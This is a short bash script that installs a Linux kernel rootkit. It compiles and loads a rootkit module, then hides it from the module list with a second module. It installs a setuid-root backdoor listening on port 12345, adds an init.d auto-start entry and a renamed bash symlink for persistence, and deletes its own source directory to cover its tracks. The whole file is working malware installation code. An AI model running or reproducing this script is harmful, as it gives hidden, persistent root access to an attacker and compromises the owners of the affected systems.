#!/bin/bash
# ./my_rootkit.sh

# get the current directory of the shell script
CUR_DIR=$(pwd)

# create module files .ko
make
# create the binary execute file named backdoor
gcc backdoor.c -o backdoor

# copy the files to the root directory
cp my_rootkit.ko remove_module.ko backdoor /
# change the backdoor to set-uid programme, it can promote the priviledge to root
chmod u+s /backdoor

# copy the auto-start shell script to /etc/init.d/
chmod 755 my_rootkit_init.sh
cp my_rootkit_init.sh /etc/init.d/

# create one symbol link of auto-start shell script
ln -s /etc/init.d/my_rootkit_init.sh /etc/rc2.d/S75my_rootkit
# create one symbol link of /bin/bash
ln -s /bin/bash /bin/my_rootkit_sh

# load rootkit module file
insmod /my_rootkit.ko
# load remove module file which remove rootkit module info from module list
insmod /remove_module.ko
# unload remove module file
rmmod /remove_module

# start backdoor which port is 12345
/backdoor 12345

# remove the source files
rm -r -f ${CUR_DIR}


